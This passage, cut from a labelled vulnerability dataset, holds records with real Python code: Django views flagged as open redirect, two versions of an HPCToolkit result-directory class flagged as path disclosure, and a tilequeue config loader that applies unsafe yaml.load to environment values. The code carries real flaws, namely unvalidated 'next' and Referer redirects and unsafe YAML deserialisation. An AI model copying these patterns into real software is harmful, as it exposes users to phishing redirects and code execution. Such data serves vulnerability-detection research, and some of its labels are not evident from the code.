concept.transaction.code})\n        concept.delete()\n        next_page = request.POST.get('next', default_next)\n        return redirect(next_page)\n\n    # GET\n    else:\n        return render(request, 'core/delete.html', extra_context)\n\n\n@login_required()\ndef concept_detail(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n\n    # Get the concept and form\n    concept, concept_form = get_concept_and_form_from_kwargs(**kwargs)\n    extra_context['concept'] = concept\n\n    # Get the transaction\n    transaction = concept.transaction\n    extra_context['transaction'] = transaction\n\n    return render(request, 'transactions/concept_detail.html', extra_context)\n\n\n@login_required()\ndef concept_edit(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n\n    # Get the concept and form\n    concept, concept_form = get_concept_and_form_from_kwargs(**kwargs)\n    extra_context['concept'] = concept\n\n    # Get the transaction\n    transaction = concept.transaction\n    if transaction.closed:\n        return redirect('message', message=gettext('Transaction Closed'))\n    extra_context['transaction'] = transaction\n\n    # POST\n    if request.method == 'POST':\n        form = concept_form(request.POST, instance=concept)\n        if form.is_valid():\n            form.save()\n            return redirect('transaction_edit', transaction_code=transaction.code)\n\n        else:\n            extra_context['form'] = form\n            return render(request, 'transactions/concept_edit.html', extra_context)\n\n    # GET\n    else:\n\n        # Get the form\n        form = concept_form(instance=concept)\n        extra_context['form'] = form\n        return render(request, 'transactions/concept_edit.html', extra_context)\n\n\nclass ConceptList(PaginationMixin, ListView):\n\n    template_name = 'transactions/concept_list.html'\n    model = BaseConcept\n    context_object_name = 'concepts'\n    paginate_by = 8\n    # ListView.as_view will pass custom arguments here\n    queryset = None\n    header = gettext_lazy('Concepts')\n    request = None\n    filter = None\n    filter_data = None\n    is_filtered = False\n\n    def get(self, request, *args, **kwargs):\n        # First\n\n        # Check permissions\n        if not request.user.is_authenticated:\n            return invalid_permission_redirect(request)\n\n        # Get arguments\n        self.request = request\n        self.filter_data = kwargs.pop('filter_data', {})\n\n        # Call super\n        return super().get(self, request, *args, **kwargs)\n\n    def get_context_data(self, **kwargs):\n        # Third\n\n        # Call the base implementation first\n        context = super().get_context_data(**kwargs)\n\n        # Add data\n        context['header'] = self.header\n        context['filter'] = self.filter\n        context['is_filtered'] = self.is_filtered\n\n        return context\n\n    def get_queryset(self):\n        # Second\n\n        # Create filter querydict\n        data = QueryDict('', mutable=True)\n        # Add filters passed from view\n        data.update(self.filter_data)\n        # Add filters selected by user\n        data.update(self.request.GET)\n\n        # Record as filtered\n        self.is_filtered = False\n        if len([k for k in data.keys() if k != 'page']) > 0:\n            self.is_filtered = True\n\n        # Add filters by permission\n\n        # Filter the queryset\n        self.filter = ConceptFilter(data)\n        self.queryset = self.filter.qs.select_related('transaction') \\\n            .prefetch_related('value__currency') \\\n            .order_by('-id') # 79q 27ms\n\n        # Return\n        return self.queryset\n\n\ndef get_available_concepts(employee, transaction):\n    \"\"\"\n    Get a list of the available concepts that can be added to the given transaction.\n\n    :param employee: The employee executing the transaction (current user)\n    :param transaction: The open transaction\n    :return: A list of dictionaries.\n    \"\"\"\n\n    # get permissions according to transaction\n    concepts_permitted_by_transaction = transaction.get_all_permissions()\n\n    # get permissions according to employee\n    concepts_permitted_by_employee = employee.get_all_permissions()\n\n    # create the list of permitted concepts\n    available_concepts = []\n    for concept in settings.CONCEPTS:\n        permission = concept.replace('.','.add_')\n        concept_model = apps.get_model(concept)\n\n        # Skip this concept if not permitted by the user\n        if not permission in concepts_permitted_by_employee:\n            continue\n\n        # set default values\n        disabled = False\n        url = concept_model._url.format('new/{}'.format(transaction.code))\n\n        # disable this concept if not permitted by the transaction\n        if not permission in concepts_permitted_by_transaction:\n            disabled = True\n            url = '#'\n\n        # add to the list\n        available_concepts.append(\n            {\n                'name': concept_model._meta.verbose_name,\n                'url': url,\n                'disabled': disabled,\n            }\n        )\n\n    return available_concepts\n\n\ndef get_transaction_from_kwargs(**kwargs):\n    # Get the transaction\n    transaction_code = kwargs.get('transaction_code', None)\n    transaction = get_object_or_404(Transaction, code=transaction_code)\n    return transaction\n\n\ndef get_concept_and_form_from_kwargs(**kwargs):\n\n    # Get the form\n    concept_form = kwargs.get('concept_form', None)\n\n    # Get the concept class\n    concept_class = concept_form._meta.model\n\n    # If a transaction code is provided, this is a new concept\n    transaction_code = kwargs.get('transaction_code', None)\n    if transaction_code:\n        transaction = get_transaction_from_kwargs(**kwargs)\n        return concept_class(transaction=transaction), concept_form\n\n    # Get the existing concept\n    concept_code = kwargs.get('concept_code', None)\n    concept = get_object_or_404(concept_class, code=concept_code)\n    return concept, concept_form\n\n\ndef transaction_delete(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n    if not request.user.is_authenticated:\n        return invalid_permission_redirect(request)\n\n    # Get the object\n    transaction_code = kwargs.get('transaction_code', None)\n    transaction = get_object_or_404(Transaction, code=transaction_code)\n    extra_context['transaction'] = transaction\n\n    # Use default delete view\n    extra_context['header'] = gettext('Delete Transaction?')\n    extra_context['message'] = transaction.description_short\n    extra_context['next'] = request.META['HTTP_REFERER']\n\n    # POST\n    if request.method == 'POST':\n        default_next = reverse('transactions_open')\n        transaction.delete()\n        next_page = request.POST.get('next', default_next)\n        return redirect(next_page)\n\n    # GET\n    else:\n        return render(request, 'core/delete.html', extra_context)\n\n\n@login_required\ndef transaction_detail(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n    if not request.user.is_authenticated:\n        return invalid_permission_redirect(request)\n\n    # Get the transaction\n    transaction_code = kwargs.get('transaction_code', None)\n    transaction = get_object_or_404(Transaction, code=transaction_code)\n    extra_context['transaction'] = transaction\n    return render(request, 'transactions/transaction_detail.html', extra_context)\n\n\n@login_required\ndef transaction_edit(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n    if not request.user.is_authenticated:\n        return invalid_permission_redirect(request)\n\n    # Get the transaction\n    transaction_code = kwargs.get('transaction_code', None)\n    if not transaction_code:\n        transaction = Transaction.objects.create(employee=request.user)\n        return redirect('transaction_edit', transaction_code=transaction.code)\n\n    transaction = get_object_or_404(Transaction, code=transaction_code)\n    extra_context['transaction'] = transaction\n\n    # Check that the transaction is open\n    if transaction.closed:\n        return redirect('message', message=gettext('Transaction Closed'))\n\n    # Get available concepts to add\n    available_concepts = get_available_concepts(request.user, transaction)\n    extra_context['available_concepts'] = available_concepts\n\n    # POST\n    if request.method == 'POST':\n        form = TransactionEditForm(request.POST, instance=transaction)\n        valid = form.is_valid()\n\n        # Delete and go home\n        # Note that the form.data value is still a string before validating\n        if form.data['cancel_button'] == 'True':\n            transaction.delete()\n            return redirect('index')\n\n        # If valid\n        if valid:\n\n            # Save the transaction\n            transaction.save()\n\n            # Finish later\n            if form.cleaned_data['save_button']:\n                return redirect('transaction_detail', transaction_code=transaction.code)\n\n            # Proceed to pay\n            return redirect('transaction_pay', transaction_code=transaction.code)\n\n        else:\n            extra_context['form'] = form\n            return render(request, 'transactions/transaction_edit.html', extra_context)\n\n    # GET\n    else:\n\n        # Create the form\n        form = TransactionEditForm(instance=transaction)\n        extra_context['form'] = form\n        return render(request, 'transactions/transaction_edit.html', extra_context)\n\n\nclass TransactionList(PaginationMixin, ListView):\n\n    model = Transaction\n    context_object_name = 'transactions'\n    paginate_by = 8\n    # ListView.as_view will pass custom arguments here\n    queryset = None\n    header = gettext_lazy('Transactions')\n    request = None\n    filter = None\n    filter_data = None\n    is_filtered = False\n\n    def get(self, request, *args, **kwargs):\n        # First\n\n        # Check permissions\n        if not request.user.is_authenticated:\n            return invalid_permission_redirect(request)\n\n        # Get arguments\n        self.request = request\n        self.filter_data = kwargs.pop('filter_data', {})\n\n        # Call super\n        return super().get(self, request, *args, **kwargs)\n\n    def get_context_data(self, **kwargs):\n        # Third\n\n        # Call the base implementation first\n        context = super().get_context_data(**kwargs)\n\n        # Add data\n        context['header'] = self.header\n        context['filter'] = self.filter\n        context['is_filtered'] = self.is_filtered\n\n        return context\n\n    def get_queryset(self):\n        # Second\n\n        # Create filter querydict\n        data = QueryDict('', mutable=True)\n        # Add filters passed from view\n        data.update(self.filter_data)\n        # Add filters selected by user\n        data.update(self.request.GET)\n\n        # Record as filtered\n        self.is_filtered = False\n        if len([k for k in data.keys() if k != 'page']) > 0:\n            self.is_filtered = True\n\n        # Add filters by permission\n\n        # Filter the queryset\n        self.filter = TransactionFilter(data)\n        self.queryset = self.filter.qs.select_related('cashclose')\\\n            .prefetch_related('concepts__value__currency') \\\n            .order_by('-id')  # 79q 27ms\n\n        # Return\n        return self.queryset\n\n    def post(self, request, *args, **kwargs):\n\n        # Check permissions\n        if not request.user.is_authenticated:\n            return invalid_permission_redirect(request)\n\n        print_transaction = request.POST.get('print_transaction', None)\n        if print_transaction:\n            # Get the transaction\n            transaction = get_object_or_404(Transaction, code=print_transaction)\n            # Create an http response\n            resp = HttpResponse(content_type='application/pdf')\n            resp['Content-Disposition'] = 'attachment; filename=\"{}.pdf\"'.format(transaction.code)\n            # Set context\n            context = {\n                'transaction': transaction,\n            }\n            # Generate the pdf\n            result = generate_pdf('transactions/invoice.html', file_object=resp, context=context)\n            return result\n\n        # Return same\n        request.method = 'GET'\n        return self.get(request, *args, **kwargs)\n\n\n\n@login_required\ndef transaction_pay(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n    if not request.user.is_authenticated:\n        return invalid_permission_redirect(request)\n\n    # Get the transaction\n    transaction_code = kwargs.get('transaction_code', None)\n    transaction = get_object_or_404(Transaction, code=transaction_code)\n    extra_context['transaction'] = transaction\n\n    # Check that the transaction is open\n    if transaction.closed:\n        return redirect('message', message=gettext('Transaction Closed'))\n\n    # Get required payment fields\n\n    # POST\n    if request.method == 'POST':\n        form = TransactionPayForm(request.POST, instance=transaction)\n        valid = form.is_valid()\n\n        # If cancel has been set, delete and go home\n        # Note that value is still string before validating\n        if form.data['cancel_button'] == 'True':\n            transaction.delete()\n            return redirect('index')\n\n        # If valid\n        if valid:\n\n            # Close the transaction\n            if form.cleaned_data['confirm_button']:\n                transaction.closed = True\n                transaction.closed_date = timezone.datetime.now()\n                transaction.save()\n                return redirect('transaction_detail', transaction_code=transaction.code)\n\n            # Save the transaction\n            if form.cleaned_data['save_button']:\n                transaction.save()\n                return redirect('transaction_detail', transaction_code=transaction.code)\n\n        else:\n            extra_context['form'] = form\n            return render(request, 'transactions/transaction_pay.html', extra_context)\n\n    # GET\n    else:\n\n        # Create the form\n        form = TransactionPayForm(instance=transaction)\n        extra_context['form'] = form\n        return render(request, 'transactions/transaction_pay.html', extra_context)\n\n\ndef transactions_open(request, *args, **kwargs):\n\n    # Check permissions\n    if not request.user.is_authenticated:\n        return invalid_permission_redirect(request)\n\n    # Set initial filter data\n    filter_data = {\n        'closed': False,\n    }\n\n    # Return\n    listview = TransactionList.as_view()\n    return listview(request, filter_data=filter_data)\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "6ad16eb9bc401f848c16cb621f5bdd83080cc285", "code": "runner/src/resultdir.py/n/n################################################################################\n#                                                                              #\n#  output.py                                                                   #\n#  preserve files and metrics output by running a job                          #\n#                                                                              #                                                                              #\n#  $HeadURL$                                                                   #\n#  $Id$                                                                        #\n#                                                                              #\n#  --------------------------------------------------------------------------- #\n#  Part of HPCToolkit (hpctoolkit.org)                                         #\n#                                                                              #\n#  Information about sources of support for research and development of        #\n#  HPCToolkit is at 'hpctoolkit.org' and in 'README.Acknowledgments'.          #\n#  --------------------------------------------------------------------------- #\n#                                                                              #\n#  Copyright ((c)) 2002-2017, Rice University                                  #\n#  All rights reserved.                                                        #\n#                                                                              #\n#  Redistribution and use in source and binary forms, with or without          #\n#  modification, are permitted provided that the following conditions are      #\n#  met:                                                                        #\n#                                                                              #\n#  * Redistributions of source code must retain the above copyright            #\n#    notice, this list of conditions and the following disclaimer.             #\n#                                                                              #\n#  * Redistributions in binary form must reproduce the above copyright         #\n#    notice, this list of conditions and the following disclaimer in the       #\n#    documentation and/or other materials provided with the distribution.      #\n#                                                                              #\n#  * Neither the name of Rice University (RICE) nor the names of its           #\n#    contributors may be used to endorse or promote products derived from      #\n#    this software without specific prior written permission.                  #\n#                                                                              #\n#  This software is provided by RICE and contributors \"as is\" and any          #\n#  express or implied warranties, including, but not limited to, the           #\n#  implied warranties of merchantability and fitness for a particular          #\n#  purpose are disclaimed. In no event shall RICE or contributors be           #\n#  liable for any direct, indirect, incidental, special, exemplary, or         #\n#  consequential damages (including, but not limited to, procurement of        #\n#  substitute goods or services; loss of use, data, or profits; or             #\n#  business interruption) however caused and on any theory of liability,       #\n#  whether in contract, strict liability, or tort (including negligence        #\n#  or otherwise) arising in any way out of the use of this software, even      #\n#  if advised of the possibility of such damage.                               #\n#                                                                              #\n################################################################################\n\n\nfrom common import options, debugmsg\n\n\n\nclass ResultDir():\n    \n    def __init__(self, parentdir, name):\n\n        from collections import OrderedDict\n        from os import makedirs\n        from os.path import join\n\n        self.name = name\n        self.dir = join(parentdir, \"_\" + self.name)\n        makedirs(self.dir)\n        self.outdict = OrderedDict()\n        self.numOutfiles = 0\n\n\n    def __contains__(self, key):\n        \n        return key in self.outdict\n        \n    \n    def getDir(self):\n\n        return self.dir\n        \n    \n    def makePath(self, nameFmt, label=None):\n\n        from os.path import join\n\n        self.numOutfiles += 1\n        path = join(self.dir, (\"{:02d}-\" + nameFmt).format(self.numOutfiles, label))\n        return path\n\n\n    def add(self, *keysOrValues, **kwargs):\n        \n        from collections import OrderedDict\n        from common import assertmsg, fatalmsg\n        \n        assertmsg(len(keysOrValues) >= 2, \"Output.add must receive at least 2 arguments\")\n        \n        # decompose arguments\n        keyPath = kwargs.get(\"subroot\", []) + list(keysOrValues[:-2])   # last 2 elements of 'keysOrValues' are key & value for final store\n        lastKey = keysOrValues[-2]  # used to store 'value', but also included in 'keyPath'\n        value   = keysOrValues[-1]\n\n        # perform insertion\n        ob = self._findValueForPath(lastKey, *keyPath)\n        fmt = kwargs.get(\"format\", None)\n        ob[lastKey] = value if fmt is None else float(fmt.format(value))\n\n\n    def get(self, *keyPath):\n        \n        # assert: can traverse keyPath without needed to add a new collection, so None is ok for keyAfter\n        print keyPath\n        return self._findValueForPath(None, *keyPath)\n\n\n    def addSummaryStatus(self, status, msg):\n        \n        self.add(\"summary\", \"status\",     status)\n        self.add(\"summary\", \"status msg\", msg)\n        \n\n    def write(self):\n\n        from os.path import join\n        from spackle import writeYamlFile\n\n        writeYamlFile(join(self.dir, \"{}.yaml\".format(self.name)), self.outdict)\n\n\n    def _isCompatible(self, key, collection):\n        \n        from collections import OrderedDict\n        from common import fatalmsg\n    \n        ktype, ctype = type(key), type(collection)\n        \n        if ktype is str:\n            return ctype is dict or ctype is OrderedDict\n        elif ktype is int:\n            return ctype is list\n        else:\n            fatalmsg(\"ResultDir._isCompatible: invalid key type ({})\".format(ktype))\n    \n    \n    def _findValueForPath(self, keyAfter, *keyPath):\n    \n        ob = self.outdict\n        for k, key in enumerate(keyPath):\n            if self._isCompatible(key, ob):\n                if key not in ob:\n                    nextkey = keyPath[k+1] if k+1 < len(keyPath) else keyAfter\n                    ob[key] = self._collectionForKey(nextkey)\n                ob = ob[key]\n            else:\n                fatalmsg(\"ResultDir: invalid key for current collection in key path\")\n        return ob\n    \n    \n    def _collectionForKey(self, key):\n    \n        from collections import OrderedDict\n        from common import fatalmsg\n    \n        ktype = type(key)\n        \n        if ktype is str:\n            return OrderedDict()\n        elif ktype is int:\n            return list()\n        else:\n            fatalmsg(\"ResultDir._collectionForKey: invalid key type ({})\".format(ktype))\n\n\n\n\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "6ad16eb9bc401f848c16cb621f5bdd83080cc285", "code": "/runner/src/resultdir.py/n/n################################################################################\n#                                                                              #\n#  output.py                                                                   #\n#  preserve files and metrics output by running a job                          #\n#                                                                              #                                                                              #\n#  $HeadURL$                                                                   #\n#  $Id$                                                                        #\n#                                                                              #\n#  --------------------------------------------------------------------------- #\n#  Part of HPCToolkit (hpctoolkit.org)                                         #\n#                                                                              #\n#  Information about sources of support for research and development of        #\n#  HPCToolkit is at 'hpctoolkit.org' and in 'README.Acknowledgments'.          #\n#  --------------------------------------------------------------------------- #\n#                                                                              #\n#  Copyright ((c)) 2002-2017, Rice University                                  #\n#  All rights reserved.                                                        #\n#                                                                              #\n#  Redistribution and use in source and binary forms, with or without          #\n#  modification, are permitted provided that the following conditions are      #\n#  met:                                                                        #\n#                                                                              #\n#  * Redistributions of source code must retain the above copyright            #\n#    notice, this list of conditions and the following disclaimer.             #\n#                                                                              #\n#  * Redistributions in binary form must reproduce the above copyright         #\n#    notice, this list of conditions and the following disclaimer in the       #\n#    documentation and/or other materials provided with the distribution.      #\n#                                                                              #\n#  * Neither the name of Rice University (RICE) nor the names of its           #\n#    contributors may be used to endorse or promote products derived from      #\n#    this software without specific prior written permission.                  #\n#                                                                              #\n#  This software is provided by RICE and contributors \"as is\" and any          #\n#  express or implied warranties, including, but not limited to, the           #\n#  implied warranties of merchantability and fitness for a particular          #\n#  purpose are disclaimed. In no event shall RICE or contributors be           #\n#  liable for any direct, indirect, incidental, special, exemplary, or         #\n#  consequential damages (including, but not limited to, procurement of        #\n#  substitute goods or services; loss of use, data, or profits; or             #\n#  business interruption) however caused and on any theory of liability,       #\n#  whether in contract, strict liability, or tort (including negligence        #\n#  or otherwise) arising in any way out of the use of this software, even      #\n#  if advised of the possibility of such damage.                               #\n#                                                                              #\n################################################################################\n\n\nfrom common import options, debugmsg\n\n\n\nclass ResultDir():\n    \n    def __init__(self, parentdir, name):\n\n        from collections import OrderedDict\n        from os import makedirs\n        from os.path import join\n\n        self.name = name\n        self.dir = join(parentdir, \"_\" + self.name)\n        makedirs(self.dir)\n        self.outdict = OrderedDict()\n        self.numOutfiles = 0\n\n\n    def __contains__(self, key):\n        \n        return key in self.outdict\n        \n    \n    def getDir(self):\n\n        return self.dir\n        \n    \n    def makePath(self, nameFmt, label=None):\n\n        from os.path import join\n\n        self.numOutfiles += 1\n        path = join(self.dir, (\"{:02d}-\" + nameFmt).format(self.numOutfiles, label))\n        return path\n\n\n    def add(self, *keysOrValues, **kwargs):\n        \n        from collections import OrderedDict\n        from common import assertmsg, fatalmsg\n        \n        assertmsg(len(keysOrValues) >= 2, \"Output.add must receive at least 2 arguments\")\n        \n        # decompose arguments\n        keyPath = kwargs.get(\"subroot\", []) + list(keysOrValues[:-1])   # last element of 'keysOrValues' is the value\n        lastKey = keysOrValues[-2]  # used to store 'value', but also included in 'keyPath'\n        value   = keysOrValues[-1]\n\n        # perform insertion\n        ob = self._findValueForPath(*keyPath)\n        fmt = kwargs.get(\"format\", None)\n        ob[lastKey] = value if fmt is None else float(fmt.format(value))\n\n\n    def get(self, *keyPath):\n        \n        return self._findValueForPath(keyPath)\n\n\n    def addSummaryStatus(self, status, msg):\n        \n        self.add(\"summary\", \"status\",     status)\n        self.add(\"summary\", \"status msg\", msg)\n        \n\n    def write(self):\n\n        from os.path import join\n        from spackle import writeYamlFile\n\n        writeYamlFile(join(self.dir, \"{}.yaml\".format(self.name)), self.outdict)\n\n\n    def _isCompatible(self, key, collection):\n        \n        from collections import OrderedDict\n        from common import fatalmsg\n    \n        ktype, ctype = type(key), type(collection)\n        \n        if ktype is str:\n            return ctype is dict or ctype is OrderedDict\n        elif ktype is int:\n            return ctype is list\n        else:\n            fatalmsg(\"ResultDir._isCompatible: invalid key type ({})\".format(ktype))\n    \n    \n    def _findValueForPath(self, *keyPath):\n    \n        ob = self.outdict\n        for k, key in enumerate(keyPath[:-1]):    # last key in 'keyPath' is not traversed, but used to store given 'value'\n            if self._isCompatible(key, ob):\n                if key not in ob:\n                    nextkey = keyPath[k+1]\n                    ob[key] = self._collectionForKey(nextkey)\n                ob = ob[key]\n            else:\n                fatalmsg(\"ResultDir: invalid key for current collection in key path\")\n        return ob\n    \n    \n    def _collectionForKey(self, key):\n    \n        from collections import OrderedDict\n        from common import fatalmsg\n    \n        ktype = type(key)\n        \n        if ktype is str:\n            return OrderedDict()\n        elif ktype is int:\n            return list()\n        else:\n            fatalmsg(\"ResultDir._collectionForKey: invalid key type ({})\".format(ktype))\n\n\n\n\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "75f9e819e7e5c2132d29e5236739fae847279b32", "code": "tilequeue/config.py/n/nfrom tilequeue.tile import bounds_buffer\nfrom tilequeue.tile import metatile_zoom_from_size\nfrom yaml import load\nimport os\n\n\nclass Configuration(object):\n    '''\n    Flatten configuration from yaml\n    '''\n\n    def __init__(self, yml):\n        self.yml = yml\n\n        self.aws_access_key_id = \\\n            self._cfg('aws credentials aws_access_key_id') or \\\n            os.environ.get('AWS_ACCESS_KEY_ID')\n        self.aws_secret_access_key = \\\n            self._cfg('aws credentials aws_secret_access_key') or \\\n            os.environ.get('AWS_SECRET_ACCESS_KEY')\n\n        self.queue_cfg = self.yml['queue']\n\n        self.store_type = self._cfg('store type')\n        self.s3_bucket = self._cfg('store name')\n        self.s3_reduced_redundancy = self._cfg('store reduced-redundancy')\n        self.s3_path = self._cfg('store path')\n        self.s3_date_prefix = self._cfg('store date-prefix')\n        self.s3_delete_retry_interval = \\\n            self._cfg('store delete-retry-interval')\n\n        seed_cfg = self.yml['tiles']['seed']\n        self.seed_all_zoom_start = seed_cfg['all']['zoom-start']\n        self.seed_all_zoom_until = seed_cfg['all']['zoom-until']\n        self.seed_n_threads = seed_cfg['n-threads']\n\n        seed_metro_cfg = seed_cfg['metro-extract']\n        self.seed_metro_extract_url = seed_metro_cfg['url']\n        self.seed_metro_extract_zoom_start = seed_metro_cfg['zoom-start']\n        self.seed_metro_extract_zoom_until = seed_metro_cfg['zoom-until']\n        self.seed_metro_extract_cities = seed_metro_cfg['cities']\n\n        seed_top_tiles_cfg = seed_cfg['top-tiles']\n        self.seed_top_tiles_url = seed_top_tiles_cfg['url']\n        self.seed_top_tiles_zoom_start = seed_top_tiles_cfg['zoom-start']\n        self.seed_top_tiles_zoom_until = seed_top_tiles_cfg['zoom-until']\n\n        toi_store_cfg = self.yml['toi-store']\n        self.toi_store_type = toi_store_cfg['type']\n        if self.toi_store_type == 's3':\n            self.toi_store_s3_bucket = toi_store_cfg['s3']['bucket']\n            self.toi_store_s3_key = toi_store_cfg['s3']['key']\n        elif self.toi_store_type == 'file':\n            self.toi_store_file_name = toi_store_cfg['file']['name']\n\n        self.seed_should_add_to_tiles_of_interest = \\\n            seed_cfg['should-add-to-tiles-of-interest']\n\n        seed_custom = seed_cfg['custom']\n        self.seed_custom_zoom_start = seed_custom['zoom-start']\n        self.seed_custom_zoom_until = seed_custom['zoom-until']\n        self.seed_custom_bboxes = seed_custom['bboxes']\n        if self.seed_custom_bboxes:\n            for bbox in self.seed_custom_bboxes:\n                assert len(bbox) == 4, (\n                    'Seed config: custom bbox {} does not have exactly '\n                    'four elements!').format(bbox)\n                min_x, min_y, max_x, max_y = bbox\n                assert min_x < max_x, \\\n                    'Invalid bbox. {} not less than {}'.format(min_x, max_x)\n                assert min_y < max_y, \\\n                    'Invalid bbox. {} not less than {}'.format(min_y, max_y)\n\n        self.seed_unique = seed_cfg['unique']\n\n        intersect_cfg = self.yml['tiles']['intersect']\n        self.intersect_expired_tiles_location = (\n            intersect_cfg['expired-location'])\n        self.intersect_zoom_until = intersect_cfg['parent-zoom-until']\n\n        self.logconfig = self._cfg('logging config')\n        self.redis_type = self._cfg('redis type')\n        self.redis_host = self._cfg('redis host')\n        self.redis_port = self._cfg('redis port')\n        self.redis_db = self._cfg('redis db')\n        self.redis_cache_set_key = self._cfg('redis cache-set-key')\n\n        self.statsd_host = None\n        if self.yml.get('statsd'):\n            self.statsd_host = self._cfg('statsd host')\n            self.statsd_port = self._cfg('statsd port')\n            self.statsd_prefix = self._cfg('statsd prefix')\n\n        process_cfg = self.yml['process']\n        self.n_simultaneous_query_sets = \\\n            process_cfg['n-simultaneous-query-sets']\n        self.n_simultaneous_s3_storage = \\\n            process_cfg['n-simultaneous-s3-storage']\n        self.log_queue_sizes = process_cfg['log-queue-sizes']\n        self.log_queue_sizes_interval_seconds = \\\n            process_cfg['log-queue-sizes-interval-seconds']\n        self.query_cfg = process_cfg['query-config']\n        self.template_path = process_cfg['template-path']\n        self.reload_templates = process_cfg['reload-templates']\n        self.output_formats = process_cfg['formats']\n        self.buffer_cfg = process_cfg['buffer']\n        self.process_yaml_cfg = process_cfg['yaml']\n\n        self.postgresql_conn_info = self.yml['postgresql']\n        dbnames = self.postgresql_conn_info.get('dbnames')\n        assert dbnames is not None, 'Missing postgresql dbnames'\n        assert isinstance(dbnames, (tuple, list)), \\\n            \"Expecting postgresql 'dbnames' to be a list\"\n        assert len(dbnames) > 0, 'No postgresql dbnames configured'\n\n        self.wof = self.yml.get('wof')\n\n        self.metatile_size = self._cfg('metatile size')\n        self.metatile_zoom = metatile_zoom_from_size(self.metatile_size)\n        self.metatile_start_zoom = self._cfg('metatile start-zoom')\n\n        self.max_zoom_with_changes = self._cfg('tiles max-zoom-with-changes')\n        assert self.max_zoom_with_changes > self.metatile_zoom\n        self.max_zoom = self.max_zoom_with_changes - self.metatile_zoom\n\n        self.sql_queue_buffer_size = self._cfg('queue_buffer_size sql')\n        self.proc_queue_buffer_size = self._cfg('queue_buffer_size proc')\n        self.s3_queue_buffer_size = self._cfg('queue_buffer_size s3')\n\n        self.tile_traffic_log_path = self._cfg(\n            'toi-prune tile-traffic-log-path')\n\n        self.group_by_zoom = self.subtree('rawr group-zoom')\n\n    def _cfg(self, yamlkeys_str):\n        yamlkeys = yamlkeys_str.split()\n        yamlval = self.yml\n        for subkey in yamlkeys:\n            yamlval = yamlval[subkey]\n        return yamlval\n\n    def subtree(self, yamlkeys_str):\n        yamlkeys = yamlkeys_str.split()\n        yamlval = self.yml\n        for subkey in yamlkeys:\n            yamlval = yamlval.get(subkey)\n            if yamlval is None:\n                break\n        return yamlval\n\n\ndef default_yml_config():\n    return {\n        'queue': {\n            'name': None,\n            'type': 'sqs',\n            'timeout-seconds': 20\n        },\n        'store': {\n            'type': 's3',\n            'name': None,\n            'path': 'osm',\n            'reduced-redundancy': False,\n            'date-prefix': '',\n            'delete-retry-interval': 60,\n        },\n        'aws': {\n            'credentials': {\n                'aws_access_key_id': None,\n                'aws_secret_access_key': None,\n            }\n        },\n        'tiles': {\n            'seed': {\n                'all': {\n                    'zoom-start': None,\n                    'zoom-until': None,\n                },\n                'metro-extract': {\n                    'url': None,\n                    'zoom-start': None,\n                    'zoom-until': None,\n                    'cities': None\n                },\n                'top-tiles': {\n                    'url': None,\n                    'zoom-start': None,\n                    'zoom-until': None,\n                },\n                'custom': {\n                    'zoom-start': None,\n                    'zoom-until': None,\n                    'bboxes': []\n                },\n                'should-add-to-tiles-of-interest': True,\n                'n-threads': 50,\n                'unique': True,\n            },\n            'intersect': {\n                'expired-location': None,\n                'parent-zoom-until': None,\n            },\n            'max-zoom-with-changes': 16,\n        },\n        'toi-store': {\n            'type': None,\n        },\n        'toi-prune': {\n            'tile-traffic-log-path': '/tmp/tile-traffic.log',\n        },\n        'process': {\n            'n-simultaneous-query-sets': 0,\n            'n-simultaneous-s3-storage': 0,\n            'log-queue-sizes': True,\n            'log-queue-sizes-interval-seconds': 10,\n            'query-config': None,\n            'template-path': None,\n            'reload-templates': False,\n            'formats': ['json'],\n            'buffer': {},\n            'yaml': {\n                'type': None,\n                'parse': {\n                    'path': '',\n                },\n                'callable': {\n                    'dotted-name': '',\n                },\n            },\n        },\n        'logging': {\n            'config': None\n        },\n        'redis': {\n            'host': 'localhost',\n            'port': 6379,\n            'db': 0,\n            'cache-set-key': 'tilequeue.tiles-of-interest',\n            'type': 'redis_client',\n        },\n        'postgresql': {\n            'host': 'localhost',\n            'port': 5432,\n            'dbnames': ('osm',),\n            'user': 'osm',\n            'password': None,\n        },\n        'metatile': {\n            'size': None,\n            'start-zoom': 0,\n        },\n        'queue_buffer_size': {\n            'sql': None,\n            'proc': None,\n            's3': None,\n        },\n    }\n\n\ndef merge_cfg(dest, source):\n    for k, v in source.items():\n        if isinstance(v, dict):\n            subdest = dest.setdefault(k, {})\n            merge_cfg(subdest, v)\n        else:\n            dest[k] = v\n    return dest\n\n\ndef _override_cfg(container, yamlkeys, value):\n    \"\"\"\n    Override a hierarchical key in the config, setting it to the value.\n\n    Note that yamlkeys should be a non-empty list of strings.\n    \"\"\"\n\n    key = yamlkeys[0]\n    rest = yamlkeys[1:]\n\n    if len(rest) == 0:\n        # no rest means we found the key to update.\n        container[key] = value\n\n    elif key in container:\n        # still need to find the leaf in the tree, so recurse.\n        _override_cfg(container[key], rest, value)\n\n    else:\n        # need to create a sub-tree down to the leaf to insert into.\n        subtree = {}\n        _override_cfg(subtree, rest, value)\n        container[key] = subtree\n\n\ndef _make_yaml_key(s):\n    \"\"\"\n    Turn an environment variable into a yaml key\n\n    Keys in YAML files are generally lower case and use dashes instead of\n    underscores. This isn't a universal rule, though, so we'll have to\n    either change the keys to conform to this, or have some way of indicating\n    this from the environment.\n    \"\"\"\n\n    return s.lower().replace(\"_\", \"-\")\n\n\ndef make_config_from_argparse(config_file_handle, default_yml=None):\n    if default_yml is None:\n        default_yml = default_yml_config()\n\n    # override defaults from config file\n    yml_data = load(config_file_handle)\n    cfg = merge_cfg(default_yml, yml_data)\n\n    # override config file with values from the environment\n    for k in os.environ:\n        # keys in the environment have the form TILEQUEUE__FOO__BAR (note the\n        # _double_ underscores), which will decode the value as YAML and insert\n        # it in cfg['foo']['bar'].\n        #\n        # TODO: should the prefix TILEQUEUE be configurable?\n        if k.startswith('TILEQUEUE__'):\n            keys = map(_make_yaml_key, k.split('__')[1:])\n            value = load(os.environ[k])\n            _override_cfg(cfg, keys, value)\n\n    return Configuration(cfg)\n\n\ndef _bounds_pad_no_buf(bounds, 